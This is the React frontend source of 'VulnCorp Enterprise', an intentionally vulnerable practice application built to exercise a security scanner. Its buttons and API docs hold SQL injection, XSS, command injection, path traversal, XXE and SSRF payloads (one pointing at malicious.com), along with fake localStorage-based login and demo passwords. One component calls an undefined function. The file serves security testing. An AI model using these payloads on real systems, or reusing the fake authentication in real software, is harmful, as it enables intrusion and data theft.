/**
 * VulnCorp Enterprise Frontend - Enterprise Version v2.0
 * =====================================================
 * 
 * Comprehensive enterprise application with vulnerability management
 * Multiple business modules: HR, Finance, CRM, Inventory, Documents
 * 40+ toggleable vulnerabilities for Nexus Hunter testing
 */

import React, { useState, useEffect } from 'react'
import { Routes, Route, Link, useNavigate } from 'react-router-dom'
import VulnerabilityManager from './pages/VulnerabilityManager'
import EnterpriseDashboard from './pages/EnterpriseDashboard'
import './App.css'

const VulnerabilityLab = () => {
  const [testResult, setTestResult] = useState<string>('')

  const testEndpoint = async (url: string, method: string = 'GET', data?: any) => {
    try {
      const options: RequestInit = {
        method,
        headers: {
          'Content-Type': 'application/json',
        },
      }
      
      if (data) {
        options.body = JSON.stringify(data)
      }

      const response = await fetch(url, options)
      const result = await response.text()
      setTestResult(result)
    } catch (error) {
      setTestResult(`Error: ${error}`)
    }
  }

  return (
    <div className="page">
      <h1>🧪 Vulnerability Testing Lab</h1>
      
      <div className="alert alert-danger">
        <h3>⚠️ Security Warning</h3>
        <p>This environment contains intentional vulnerabilities for testing purposes only!</p>
      </div>

      <div className="vuln-tests">
        <div className="test-section">
          <h3>SQL Injection Tests</h3>
          <div className="test-buttons">
            <button onClick={() => testEndpoint("/api/vulnerable/sql/search?q=test' UNION SELECT 1,version(),user(),4 --")}>
              Test Union-Based SQL Injection
            </button>
            <button onClick={() => testEndpoint("/api/vulnerable/sql/login", "POST", {username: "admin' OR '1'='1' --", password: "anything"})}>
              Test Login Bypass
            </button>
          </div>
        </div>

        <div className="test-section">
          <h3>XSS Tests</h3>
          <div className="test-buttons">
            <button onClick={() => testEndpoint("/api/vulnerable/xss/search?q=<script>alert('XSS')</script>")}>
              Test Reflected XSS
            </button>
            <button onClick={() => testEndpoint("/api/vulnerable/xss/comment", "POST", {author: "tester", comment: "<script>alert('Stored XSS')</script>"})}>
              Test Stored XSS
            </button>
          </div>
        </div>

        <div className="test-section">
          <h3>Command Injection Tests</h3>
          <div className="test-buttons">
            <button onClick={() => testEndpoint("/api/vulnerable/rce/ping", "POST", {host: "127.0.0.1; whoami"})}>
              Test Command Injection
            </button>
          </div>
        </div>

        <div className="test-section">
          <h3>Business Logic Tests</h3>
          <div className="test-buttons">
            <button onClick={() => testEndpoint("/api/vulnerable/business/purchase", "POST", {productId: 1, quantity: 1, price: -100})}>
              Test Price Manipulation
            </button>
          </div>
        </div>
      </div>

      {testResult && (
        <div className="test-results">
          <h3>Test Results</h3>
          <pre>{testResult}</pre>
        </div>
      )}
    </div>
  )
}

// ================ ENTERPRISE MODULES ================

const HRManagement = () => {
  const [testResult, setTestResult] = useState<string>('')

  const testEndpoint = async (url: string, method: string = 'GET', data?: any) => {
    try {
      const options: RequestInit = {
        method,
        headers: {
          'Content-Type': 'application/json',
        },
      }
      
      if (data) {
        options.body = JSON.stringify(data)
      }

      const response = await fetch(url, options)
      const result = await response.text()
      setTestResult(result)
    } catch (error) {
      setTestResult(`Error: ${error}`)
    }
  }

  return (
  <div className="page">
    <h1>👥 HR Management System</h1>
    
    <div className="stats-grid">
      <div className="stat-card">
        <h3>1,247</h3>
        <p>Total Employees</p>
      </div>
      <div className="stat-card">
        <h3>89</h3>
        <p>New Hires</p>
      </div>
      <div className="stat-card">
        <h3>15</h3>
        <p>Open Positions</p>
      </div>
      <div className="stat-card alert">
        <h3>23</h3>
        <p>HR Vulnerabilities</p>
      </div>
    </div>

    <div className="content-section">
      <h2>🔐 Authentication Testing</h2>
      <div className="test-buttons">
        <button onClick={() => testEndpoint("/api/hr/employees/search?q=' OR '1'='1' --")}>
          Test Employee Search SQL Injection
        </button>
        <button onClick={() => testEndpoint("/api/hr/payroll/details", "POST", {employeeId: "../../../etc/passwd"})}>
          Test Payroll LFI
        </button>
        <button onClick={() => testEndpoint("/api/hr/notes", "POST", {note: "<script>alert('XSS')</script>"})}>
          Test HR Notes XSS
        </button>
      </div>
    </div>

    <div className="recent-activity">
      <h3>Recent HR Activities</h3>
      <div className="activity-item">Employee database accessed without authorization</div>
      <div className="activity-item">Salary information exposed via API</div>
      <div className="activity-item">LDAP injection in employee directory</div>
    </div>

    {testResult && (
      <div className="test-results">
        <h3>Test Results</h3>
        <pre>{testResult}</pre>
      </div>
    )}
  </div>
  )
}

const FinanceModule = () => {
  const [testResult, setTestResult] = useState<string>('')

  const testEndpoint = async (url: string, method: string = 'GET', data?: any) => {
    try {
      const options: RequestInit = {
        method,
        headers: {
          'Content-Type': 'application/json',
        },
      }

      if (data) {
        options.body = JSON.stringify(data)
      }

      const response = await fetch(url, options)
      const result = await response.text()
      setTestResult(result)
    } catch (error) {
      setTestResult(`Error: ${error}`)
    }
  }

  return (
    <div className="page">
      <h1>💰 Financial Management System</h1>
      
      <div className="stats-grid">
        <div className="stat-card">
          <h3>$2.3M</h3>
          <p>Total Revenue</p>
        </div>
        <div className="stat-card">
          <h3>$456K</h3>
          <p>Monthly Expenses</p>
        </div>
        <div className="stat-card">
          <h3>789</h3>
          <p>Invoices</p>
        </div>
        <div className="stat-card critical">
          <h3>18</h3>
          <p>Finance Vulnerabilities</p>
        </div>
      </div>

      <div className="content-section">
        <h2>💳 Payment Processing Testing</h2>
        <div className="test-buttons">
          <button onClick={() => testEndpoint("/api/finance/transfer", "POST", {amount: -1000, account: "attacker"})}>
            Test Negative Amount Transfer
          </button>
          <button onClick={() => testEndpoint("/api/finance/statements?file=../../../etc/passwd")}>
            Test Financial Statements LFI
          </button>
          <button onClick={() => testEndpoint("/api/finance/reports", "POST", {template: "{{7*7}}"})}>
            Test Template Injection in Reports
          </button>
        </div>
      </div>

      <div className="recent-activity">
        <h3>Recent Financial Activities</h3>
        <div className="activity-item alert">Unauthorized access to financial records</div>
        <div className="activity-item alert">Price manipulation detected in transactions</div>
        <div className="activity-item warning">Unusual transfer patterns detected</div>
      </div>

      {testResult && (
        <div className="test-results">
          <h3>Test Results</h3>
          <pre>{testResult}</pre>
        </div>
      )}
    </div>
  )
}

const CRMModule = () => {
  const [testResult, setTestResult] = useState<string>('')

  const testEndpoint = async (url: string, method: string = 'GET', data?: any) => {
    try {
      const options: RequestInit = {
        method,
        headers: {
          'Content-Type': 'application/json',
        },
      }

      if (data) {
        options.body = JSON.stringify(data)
      }

      const response = await fetch(url, options)
      const result = await response.text()
      setTestResult(result)
    } catch (error) {
      setTestResult(`Error: ${error}`)
    }
  }

  return (
    <div className="page">
      <h1>🤝 Customer Relationship Management</h1>
      
      <div className="stats-grid">
        <div className="stat-card">
          <h3>5,432</h3>
          <p>Total Customers</p>
        </div>
        <div className="stat-card">
          <h3>234</h3>
          <p>Active Leads</p>
        </div>
        <div className="stat-card">
          <h3>89%</h3>
          <p>Satisfaction Rate</p>
        </div>
        <div className="stat-card alert">
          <h3>15</h3>
          <p>CRM Vulnerabilities</p>
        </div>
      </div>

      <div className="content-section">
        <h2>👥 Customer Data Testing</h2>
        <div className="test-buttons">
          <button onClick={() => testEndpoint("/api/crm/customers/search", "POST", {"$ne": null})}>
            Test NoSQL Injection in Customer Search
          </button>
          <button onClick={() => testEndpoint("/api/crm/feedback", "POST", {comment: "<img src=x onerror=alert('XSS')>"})}>
            Test Stored XSS in Feedback
          </button>
          <button onClick={() => testEndpoint("/api/crm/export?customers=all&format=xml&callback=http://malicious.com")}>
            Test SSRF in Data Export
          </button>
        </div>
      </div>

      <div className="recent-activity">
        <h3>Recent CRM Activities</h3>
        <div className="activity-item">Customer data leaked through API</div>
        <div className="activity-item">Cross-site scripting in customer feedback</div>
        <div className="activity-item">Unauthorized customer profile access</div>
      </div>

      {testResult && (
        <div className="test-results">
          <h3>Test Results</h3>
          <pre>{testResult}</pre>
        </div>
      )}
    </div>
  )
}

const InventoryModule = () => {
  const [testResult, setTestResult] = useState<string>('')

  const testEndpoint = async (url: string, method: string = 'GET', data?: any) => {
    try {
      const options: RequestInit = {
        method,
        headers: {
          'Content-Type': 'application/json',
        },
      }
      
      if (data) {
        options.body = JSON.stringify(data)
      }

      const response = await fetch(url, options)
      const result = await response.text()
      setTestResult(result)
    } catch (error) {
      setTestResult(`Error: ${error}`)
    }
  }

  return (
  <div className="page">
    <h1><span className="text-icon">[INV]</span>Inventory Management System</h1>
    
    <div className="stats-grid">
      <div className="stat-card">
        <h3>2,156</h3>
        <p>Products</p>
      </div>
      <div className="stat-card">
        <h3>45,789</h3>
        <p>Items in Stock</p>
      </div>
      <div className="stat-card">
        <h3>123</h3>
        <p>Low Stock Alerts</p>
      </div>
      <div className="stat-card warning">
        <h3>12</h3>
        <p>Inventory Vulnerabilities</p>
      </div>
    </div>

    <div className="content-section">
      <h2>Inventory Testing</h2>
      <div className="test-buttons">
        <button onClick={() => testEndpoint("/api/inventory/search", "POST", {"$where": "this.price < 0"})}>
          Test MongoDB Injection
        </button>
        <button onClick={() => testEndpoint("/api/inventory/update", "POST", {productId: 1, quantity: -999999})}>
          Test Business Logic - Negative Inventory
        </button>
        <button onClick={() => testEndpoint("/api/inventory/export?format=xml&file=../../../../etc/passwd")}>
          Test Path Traversal in Export
        </button>
      </div>
    </div>

    <div className="recent-activity">
      <h3>Recent Inventory Activities</h3>
      <div className="activity-item">Inventory manipulation detected</div>
      <div className="activity-item">Unauthorized stock level changes</div>
      <div className="activity-item">Price manipulation in product catalog</div>
    </div>

    {testResult && (
      <div className="test-results">
        <h3>Test Results</h3>
        <pre>{testResult}</pre>
      </div>
    )}
  </div>
  )
}

const DocumentsModule = () => {
  const [testResult, setTestResult] = useState<string>('')

  const testEndpoint = async (url: string, method: string = 'GET', data?: any) => {
    try {
      const options: RequestInit = {
        method,
        headers: {
          'Content-Type': 'application/json',
        },
      }

      if (data) {
        options.body = typeof data === 'string' ? data : JSON.stringify(data)
      }

      const response = await fetch(url, options)
      const result = await response.text()
      setTestResult(result)
    } catch (error) {
      setTestResult(`Error: ${error}`)
    }
  }

  return (
    <div className="page">
      <h1>📄 Document Management System</h1>
      
      <div className="stats-grid">
        <div className="stat-card">
          <h3>8,934</h3>
          <p>Total Documents</p>
        </div>
        <div className="stat-card">
          <h3>156</h3>
          <p>Shared Files</p>
        </div>
        <div className="stat-card">
          <h3>2.3TB</h3>
          <p>Storage Used</p>
        </div>
        <div className="stat-card critical">
          <h3>19</h3>
          <p>Document Vulnerabilities</p>
        </div>
      </div>

      <div className="content-section">
        <h2>📎 File Operations Testing</h2>
        <div className="test-buttons">
          <button onClick={() => testEndpoint("/api/documents/upload", "POST", {filename: "../../malware.exe"})}>
            Test Unrestricted File Upload
          </button>
          <button onClick={() => testEndpoint("/api/documents/view?file=../../../etc/passwd")}>
            Test Local File Inclusion
          </button>
          <button onClick={() => testEndpoint("/api/documents/parse", "POST", `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><root>&xxe;</root>`)}>
            Test XXE in Document Parser
          </button>
        </div>
      </div>

      <div className="recent-activity">
        <h3>Recent Document Activities</h3>
        <div className="activity-item alert">Malicious file uploaded successfully</div>
        <div className="activity-item alert">Sensitive file accessed without authorization</div>
        <div className="activity-item warning">XXE attack attempted on XML parser</div>
      </div>

      {testResult && (
        <div className="test-results">
          <h3>Test Results</h3>
          <pre>{testResult}</pre>
        </div>
      )}
    </div>
  )
}

const AdminPanel = () => {
  const [testResult, setTestResult] = useState<string>('')

  const testEndpoint = async (url: string, method: string = 'GET', data?: any) => {
    try {
      const options: RequestInit = {
        method,
        headers: {
          'Content-Type': 'application/json',
        },
      }
      
      if (data) {
        options.body = JSON.stringify(data)
      }

      const response = await fetch(url, options)
      const result = await response.text()
      setTestResult(result)
    } catch (error) {
      setTestResult(`Error: ${error}`)
    }
  }

  return (
  <div className="page">
    <h1><span className="text-icon">[ADM]</span>Admin Panel & System Management</h1>
    
    <div className="stats-grid">
      <div className="stat-card">
        <h3>47</h3>
        <p>System Users</p>
      </div>
      <div className="stat-card">
        <h3>12</h3>
        <p>Active Sessions</p>
      </div>
      <div className="stat-card">
        <h3>89%</h3>
        <p>System Health</p>
      </div>
      <div className="stat-card critical">
        <h3>31</h3>
        <p>Admin Vulnerabilities</p>
      </div>
    </div>

    <div className="content-section">
      <h2>System Administration Testing</h2>
      <div className="test-buttons">
        <button onClick={() => testEndpoint("/api/admin/users", "POST", {username: "hacker", password: "admin123", role: "superadmin"})}>
          Test Privilege Escalation
        </button>
        <button onClick={() => testEndpoint("/api/admin/execute", "POST", {command: "cat /etc/passwd; whoami"})}>
          Test Command Injection
        </button>
        <button onClick={() => testEndpoint("/api/admin/backup?path=../../../")}>
          Test Directory Traversal
        </button>
      </div>
    </div>

    <div className="recent-activity">
      <h3>Recent Admin Activities</h3>
      <div className="activity-item critical">Unauthorized admin account created</div>
      <div className="activity-item critical">System commands executed by non-admin user</div>
      <div className="activity-item alert">Sensitive system files accessed</div>
    </div>

    {testResult && (
      <div className="test-results">
        <h3>Test Results</h3>
        <pre>{testResult}</pre>
      </div>
    )}
  </div>
  )
}

const APIGateway = () => (
  <div className="page">
    <h1>🌐 API Gateway & Microservices</h1>
    
    <div className="stats-grid">
      <div className="stat-card">
        <h3>47</h3>
        <p>API Endpoints</p>
      </div>
      <div className="stat-card">
        <h3>234K</h3>
        <p>Daily Requests</p>
      </div>
      <div className="stat-card">
        <h3>99.2%</h3>
        <p>Uptime</p>
      </div>
      <div className="stat-card critical">
        <h3>25</h3>
        <p>API Vulnerabilities</p>
      </div>
    </div>

    <div className="content-section">
      <h2>🔌 API Security Testing</h2>
      <div className="test-buttons">
        <button onClick={() => testEndpoint("/api/v1/users/1/../../admin/secrets")}>
          Test API Path Traversal
        </button>
        <button onClick={() => testEndpoint("/api/graphql", "POST", {query: `{users{id,username,password,email,ssn}}`})}>
          Test GraphQL Excessive Data Exposure
        </button>
        <button onClick={() => testEndpoint("/api/internal/debug", "GET", {}, {"X-Forwarded-For": "127.0.0.1"})}>
          Test API Authentication Bypass
        </button>
      </div>
    </div>

    <div className="recent-activity">
      <h3>Recent API Activities</h3>
      <div className="activity-item">API rate limiting bypassed</div>
      <div className="activity-item">Sensitive data exposed in API response</div>
      <div className="activity-item">Authentication bypass on internal endpoints</div>
    </div>
  </div>
)

const LoginPage = () => {
  const [username, setUsername] = useState('')
  const [password, setPassword] = useState('')
  const navigate = useNavigate()

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault()
    // Simple authentication simulation
    if (username && password) {
      localStorage.setItem('user', JSON.stringify({username, role: 'admin'}))
      navigate('/dashboard')
    }
  }

  return (
    <div className="login-page">
      <div className="login-form">
        <h1>🏢 VulnCorp Enterprise</h1>
        <h2>Security Testing Platform</h2>
        
        <form onSubmit={handleLogin}>
          <input
            type="text"
            placeholder="Username"
            value={username}
            onChange={(e) => setUsername(e.target.value)}
            required
          />
          <input
            type="password"
            placeholder="Password"
            value={password}
            onChange={(e) => setPassword(e.target.value)}
            required
          />
          <button type="submit">Sign In</button>
        </form>

        <div className="demo-credentials">
          <h3>Demo Credentials</h3>
          <p><strong>Admin:</strong> admin / admin123</p>
          <p><strong>User:</strong> user / user123</p>
          <p><strong>Test:</strong> test / test123</p>
        </div>
      </div>
    </div>
  )
}

const App = () => {
  const [user, setUser] = useState<any>(null)

  useEffect(() => {
    const storedUser = localStorage.getItem('user')
    if (storedUser) {
      setUser(JSON.parse(storedUser))
    }
  }, [])

  const logout = () => {
    localStorage.removeItem('user')
    setUser(null)
  }

  if (!user) {
    return (
      <Routes>
        <Route path="*" element={<LoginPage />} />
      </Routes>
    )
  }

  return (
    <div className="app">
      <nav className="navbar">
        <div className="nav-brand">
          <span className="text-xl">🏢</span>VulnCorp Enterprise
        </div>
          <div className="nav-links">
            <Link to="/dashboard"><span>🏠</span>Dashboard</Link>
            <Link to="/vulnerability-manager"><span>🛡️</span>Vulnerabilities</Link>
            <Link to="/vulnerability-lab"><span>🧪</span>Security Lab</Link>
            <div className="dropdown">
              <span className="dropdown-toggle">📁 Modules ▼</span>
              <div className="dropdown-menu">
                <Link to="/hr"><span>👥</span>HR Management</Link>
                <Link to="/finance"><span>💰</span>Finance</Link>
                <Link to="/crm"><span>🤝</span>CRM</Link>
                <Link to="/inventory"><span>📦</span>Inventory</Link>
                <Link to="/documents"><span>📄</span>Documents</Link>
                <Link to="/admin"><span>🔐</span>Admin Panel</Link>
              </div>
            </div>
            <Link to="/api-docs">📚 API Docs</Link>
            <span className="user-info">Welcome, {user.username} ({user.role})</span>
            <button onClick={logout} className="logout-btn">Logout</button>
          </div>
      </nav>

      <main className="main-content">
        <Routes>
          <Route path="/" element={<EnterpriseDashboard />} />
          <Route path="/dashboard" element={<EnterpriseDashboard />} />
          <Route path="/vulnerability-manager" element={<VulnerabilityManager />} />
          <Route path="/vulnerability-lab" element={<VulnerabilityLab />} />
          <Route path="/hr" element={<HRManagement />} />
          <Route path="/finance" element={<FinanceModule />} />
          <Route path="/crm" element={<CRMModule />} />
          <Route path="/inventory" element={<InventoryModule />} />
          <Route path="/documents" element={<DocumentsModule />} />
          <Route path="/admin" element={<AdminPanel />} />
          <Route path="/api-gateway" element={<APIGateway />} />
          <Route path="/api-docs" element={<APIDocs />} />
        </Routes>
      </main>

      <footer className="footer">
        <p>VulnCorp Enterprise v1.0.0 | ⚠️ Contains intentional vulnerabilities for testing</p>
        <p>User: {user.username} | Session: {Date.now().toString().slice(-8)}</p>
      </footer>
    </div>
  )
}

const APIDocs = () => (
  <div className="page">
    <h1>📚 API Documentation</h1>
    
    <div className="api-section">
      <h2>Vulnerability Testing Endpoints</h2>
      
      <div className="endpoint">
        <h3>SQL Injection</h3>
        <code>GET /api/vulnerable/sql/search?q=&lt;payload&gt;</code>
        <p>Test various SQL injection techniques</p>
        <p><strong>Example:</strong> <code>?q=test' UNION SELECT 1,version(),user(),4 --</code></p>
      </div>

      <div className="endpoint">
        <h3>XSS Testing</h3>
        <code>GET /api/vulnerable/xss/search?q=&lt;payload&gt;</code>
        <p>Test reflected XSS vulnerabilities</p>
        <p><strong>Example:</strong> <code>?q=&lt;script&gt;alert('XSS')&lt;/script&gt;</code></p>
      </div>

      <div className="endpoint">
        <h3>Command Injection</h3>
        <code>POST /api/vulnerable/rce/ping</code>
        <p>Test command injection in network utilities</p>
        <p><strong>Body:</strong> <code>{`{"host": "127.0.0.1; whoami"}`}</code></p>
      </div>

      <div className="endpoint">
        <h3>Business Logic</h3>
        <code>POST /api/vulnerable/business/purchase</code>
        <p>Test price manipulation vulnerabilities</p>
        <p><strong>Body:</strong> <code>{`{"productId": 1, "quantity": 1, "price": -100}`}</code></p>
      </div>
    </div>

    <div className="nexus-hunter-info">
      <h2>🎯 Nexus Hunter Integration</h2>
      <p>This application is designed to test all Nexus Hunter security agents:</p>
      <pre><code># Run full scan
nexus-hunter scan --type full --target http://localhost:3001

# Test specific vulnerabilities  
nexus-hunter scan --agent sql_injection --target http://localhost:3001/api/vulnerable/sql
nexus-hunter scan --agent xss --target http://localhost:3001/api/vulnerable/xss
nexus-hunter scan --agent rce --target http://localhost:3001/api/vulnerable/rce</code></pre>
    </div>
  </div>
)

export default App